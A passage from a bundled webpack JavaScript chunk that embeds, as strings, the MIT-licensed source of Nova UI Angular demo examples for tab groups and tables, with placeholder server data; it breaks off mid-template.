IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tabgroup-example",\n    templateUrl: "./tabgroup-docs.example.component.html",\n})\nexport class TabgroupDocsExampleComponent {\n    public tabsRouteConfig: string = `\n    children: [\n        {\n            path: "",\n            redirectTo: "tab-settings",\n            // pathMatch strategy is used here because we redirect to another route from an empty path.\n            // For more info please refer to these docs: https://angular.io/api/router/Route#pathMatch\n            pathMatch: "full",\n        },\n        {\n            path: "tab-settings",\n            component: TabContentSettingsExampleComponent,\n        },\n        {\n            path: "tab-statistics",\n            component: TabContentStatisticsExampleComponent,\n        },\n        {\n            path: "tab-about",\n            component: TabContentAboutExampleComponent,\n        },\n    ],`;\n}\n'},41517:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule, Routes } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiContentModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiMessageModule,\n    NuiSwitchModule,\n    NuiTabsModule,\n    NuiTextboxModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TabContentAboutExampleComponent,\n    TabContentSettingsExampleComponent,\n    TabContentStatisticsExampleComponent,\n    TabgroupDocsExampleComponent,\n    TabHeadingGroupDynamicExampleComponent,\n    TabHeadingGroupHorizontalExampleComponent,\n    TabHeadingGroupHorizontalWithIconsExampleComponent,\n    TabHeadingGroupHorizontalWithIconsOnlyExampleComponent,\n    TabHeadingGroupResponsiveExampleComponent,\n    TabHeadingGroupTestComponent,\n    TabHeadingGroupVerticalExampleComponent,\n    TabHeadingGroupVerticalWithIconsExampleComponent,\n    TabHeadingGroupWithContentExampleComponent,\n    TabHeadingGroupWithIconsExampleComponent,\n    TabHeadingGroupWithRouterExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes: Routes = [\n    {\n        path: "",\n        component: TabgroupDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n        children: [\n            {\n                path: "",\n                redirectTo: "tab-settings",\n                pathMatch: "full",\n                data: {\n                    srlc: {\n                        stage: SrlcStage.ga,\n                    },\n                },\n            },\n            {\n                path: "tab-settings",\n                component: TabContentSettingsExampleComponent,\n                data: {\n                    srlc: {\n                        stage: SrlcStage.ga,\n                    },\n                    showThemeSwitcher: true,\n                },\n            },\n            {\n                path: "tab-statistics",\n                component: TabContentStatisticsExampleComponent,\n                data: {\n                    srlc: {\n                        stage: SrlcStage.ga,\n                    },\n                    showThemeSwitcher: true,\n                },\n            },\n            {\n                path: "tab-about",\n                component: TabContentAboutExampleComponent,\n                data: {\n                    srlc: {\n                        stage: SrlcStage.ga,\n                    },\n                    showThemeSwitcher: true,\n                },\n            },\n        ],\n    },\n    {\n        path: "tabgroup-test",\n        component: TabHeadingGroupTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiTabsModule,\n        NuiSwitchModule,\n        NuiContentModule,\n        NuiValidationMessageModule,\n        NuiTextboxModule,\n        NuiFormFieldModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiExpanderModule,\n        NuiDocsModule,\n        NuiIconModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TabgroupDocsExampleComponent,\n        TabContentAboutExampleComponent,\n        TabContentSettingsExampleComponent,\n        TabContentStatisticsExampleComponent,\n        TabHeadingGroupTestComponent,\n        TabHeadingGroupDynamicExampleComponent,\n        TabHeadingGroupWithIconsExampleComponent,\n        TabHeadingGroupHorizontalExampleComponent,\n        TabHeadingGroupHorizontalWithIconsExampleComponent,\n        TabHeadingGroupWithContentExampleComponent,\n        TabHeadingGroupWithRouterExampleComponent,\n        TabHeadingGroupVerticalExampleComponent,\n        TabHeadingGroupVerticalWithIconsExampleComponent,\n        TabHeadingGroupHorizontalWithIconsOnlyExampleComponent,\n        TabHeadingGroupResponsiveExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("tabgroup"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class TabgroupModule {}\n'},92777:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./table-docs/table-docs.example.component";\nexport * from "./table-basic/table-basic.example.component";\nexport * from "./table-pinned-header/table-pinned-header.example.component";\nexport * from "./table-cell-content-align/table-cell-content-align.example.component";\nexport * from "./table-cell-width-set/table-cell-width-set.example.component";\nexport * from "./table-row-clickable/table-row-clickable.example.component";\nexport * from "./table-row-height-set/table-row-height-set.example.component";\nexport * from "./table-reorder/table-reorder.example.component";\nexport * from "./table-pagination/table-pagination.example.component";\nexport * from "./table-columns-add-remove/table-columns-add-remove.example.component";\nexport * from "./table-search/table-search.example.component";\nexport * from "./table-sorting/table-sorting.example.component";\nexport * from "./table-resize/table-resize.example.component";\nexport * from "./table-select/table-select.example.component";\nexport * from "./table-selectable-toggle/table-selectable-toggle.example.component";\nexport * from "./table-test/table-test.component";\nexport * from "./table-visual-test/table-visual-test.example";\nexport * from "./table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component";\nexport * from "./table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component";\nexport * from "./table-virtual-scroll-select-sticky-header/table-virtual-scroll-select-sticky-header-example.component";\nexport * from "./table-virtual-scroll-sticky-header/table-virtual-scroll-sticky-header-example.component";\nexport * from "./table-virtual-scroll-sticky-header-test/table-virtual-scroll-sticky-header-test-example.component";\nexport * from "./table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component";\nexport * from "./table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component";\nexport * from "./table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component";\nexport * from "./table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component";\nexport * from "./table-select-pinned-header/table-select-pinned-header.example.component";\n'},16391:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-basic-table">\n    <table nui-table [dataSource]="dataSource" style="height: 100px">\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    >\n                    </nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},69056:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n"},41343:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-basic-example",\n    templateUrl: "./table-basic.example.component.html",\n    styleUrls: ["./table-basic.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableBasicExampleComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 25,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 31,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 22,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 37,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},19527:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-cell-content-align">\n    <table nui-table [dataSource]="dataSource">\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef alignment="center" i18n>\n                No.\n            </th>\n            <td nui-cell *nuiCellDef="let element" alignment="center">\n                {{ element.position }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    >\n                    </nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element" alignment="center">\n                {{ element.asset }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element" class="align-to-top">\n                {{ element.location }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center justify-content-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element" class="align-to-bottom">\n                {{ element.outages }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},85011:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n\n.align-to-top {\n    vertical-align: top;\n}\n\n.align-to-bottom {\n    vertical-align: bottom;\n}\n"},46687:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-cell-content-align-example",\n    templateUrl: "./table-cell-content-align.example.component.html",\n    styleUrls: ["./table-cell-content-align.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableCellContentAlignComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 92,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 11,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 43,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 65,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 29,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},34031:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-cell-width-set">\n    <section class="demo-options-section mb-1">\n        <nui-textbox-number\n            id="position-input"\n            [value]="positionWidth"\n            customBoxWidth="150px"\n            (valueChange)="onOptionChange($event)"\n        >\n        </nui-textbox-number>\n    </section>\n\n    <table nui-table [dataSource]="dataSource">\n        <ng-container nuiColumnDef="position">\n            \x3c!-- set the width of a column --\x3e\n            <th\n                nui-header-cell\n                *nuiHeaderCellDef\n                [style.width.px]="positionWidth"\n                i18n\n            >\n                No.\n            </th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="item">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Item</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.item }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="description">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Description</th>\n\n            \x3c!-- set the tooltip text for a cell --\x3e\n            <td\n                nui-cell\n                *nuiCellDef="let element"\n                [tooltipText]="element.description"\n            >\n                {{ element.description }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef>\n                <div class="d-flex align-items-center">\n                    <nui-icon icon="enable"></nui-icon>\n                </div>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},84951:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    item: string;\n    description: string;\n    status: string;\n    location: string;\n}\n\n@Component({\n    selector: "nui-table-cell-width-set",\n    templateUrl: "./table-cell-width-set.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableCellWidthSetExampleComponent {\n    public positionWidth = 50;\n    public displayedColumns = [\n        "position",\n        "item",\n        "description",\n        "status",\n        "location",\n    ];\n    public dataSource = getData();\n\n    public onOptionChange(value: number): void {\n        this.positionWidth = value;\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            item: "FOCUS-SVR-02258123",\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 2,\n            item: "Man-LT-JYJ4AD5",\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 3,\n            item: "FOCUS-SVR-02258",\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 4,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 5,\n            item: "Man-LT-JYJ4AD5",\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n    ];\n}\n'},2031:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    class="nui-edge-definer nui-table__container"\n    id="nui-demo-table-columns-add-remove"\n>\n    <section class="demo-options-section mb-3">\n        <button\n            type="button"\n            id="nui-demo-table-columns-add-remove-edit-btn"\n            nui-button\n            icon="edit"\n            (click)="open(content)"\n            i18n\n        >\n            Edit columns\n        </button>\n\n        <ng-template #content let-close="close" let-dismiss="dismiss">\n            <nui-dialog-header\n                i18n-title\n                title="Edit columns"\n                (closed)="close()"\n            ></nui-dialog-header>\n            <form [formGroup]="myForm">\n                <div class="form-group">\n                    <div class="dialog-body">\n                        <nui-message\n                            [allowDismiss]="true"\n                            type="critical"\n                            *ngIf="\n                                !myForm.controls[\'checkboxGroup\'].valid &&\n                                myForm.controls[\'checkboxGroup\'].touched\n                            "\n                        >\n                            <b i18n>Select minimum 3 checkboxes!</b>\n                        </nui-message>\n\n                        <h5 i18n>Available columns</h5>\n                        <nui-checkbox-group\n                            id="nui-demo-table-add-remove-checkboxes"\n                            [values]="displayedColumnsCopy"\n                            (valuesChange)="columnsChanged($event)"\n                            formControlName="checkboxGroup"\n                            required\n                        >\n                            <nui-checkbox\n                                *ngFor="let availableColumn of availableColumns"\n                                [value]="availableColumn"\n                                class="text-capitalize"\n                                [checked]="isChecked(availableColumn)"\n                            >\n                                {{ availableColumn }}\n                            </nui-checkbox>\n                        </nui-checkbox-group>\n\n                        <nui-divider></nui-divider>\n\n                        <h5 i18n>Create new column</h5>\n                        <div class="d-flex flex-row">\n                            <div class="col">\n                                <nui-textbox\n                                    id="nui-demo-table-add-remove-new-column-textbox"\n                                    [value]="newColumn"\n                                    (textChange)="updateNewColumnValue($event)"\n                                    i18n-placeholder\n                                    placeholder="Enter new column title"\n                                >\n                                </nui-textbox>\n                            </div>\n                            <div class="col col-auto">\n                                <button\n                                    nui-button\n                                    type="button"\n                                    displayStyle="default"\n                                    id="nui-demo-table-add-remove-new-column-btn"\n                                    class="ml-3"\n                                    (click)="addNewColumn()"\n                                    i18n\n                                >\n                                    Add new column\n                                </button>\n                            </div>\n                        </div>\n                    </div>\n                    <nui-dialog-footer>\n                        <button\n                            nui-button\n                            type="button"\n                            (click)="close(\'Cancel\')"\n                            i18n\n                        >\n                            Cancel\n                        </button>\n                        <button\n                            nui-button\n                            type="button"\n                            id="nui-demo-table-columns-add-remove-submit-btn"\n                            displayStyle="primary"\n                            (click)="updateColumns(); close(\'Action\')"\n                            [disabled]="\n                                myForm.controls[\'checkboxGroup\'].invalid\n                            "\n                            i18n\n                        >\n                            Update columns\n                        </button>\n                    </nui-dialog-footer>\n                </div>\n            </form>\n        </ng-template>\n    </section>\n    <table nui-table [dataSource]="dataSource">\n        <ng-container\n            *ngFor="let column of displayedColumns"\n            nuiColumnDef="{{ column }}"\n        >\n            <th nui-header-cell *nuiHeaderCellDef class="text-capitalize">\n                {{ column }}\n            </th>\n            <td\n                nui-cell\n                *nuiCellDef="let element"\n                [class.overflow-visible]="columnIsActions(column)"\n            >\n                <span *ngIf="!columnIsActions(column)">{{\n                    element[column]\n                }}</span>\n                <span *ngIf="columnIsActions(column)">\n                    <nui-menu icon="menu">\n                        <nui-menu-action (actionDone)="prependRow()" i18n\n                            >Add new row to the beginning</nui-menu-action\n                        >\n                        <nui-menu-action (actionDone)="appendRow()" i18n\n                            >Add new row to the end</nui-menu-action\n                        >\n                        <nui-menu-action (actionDone)="deleteRow(element)" i18n\n                            >Delete row</nui-menu-action\n                        >\n                    </nui-menu>\n                </span>\n            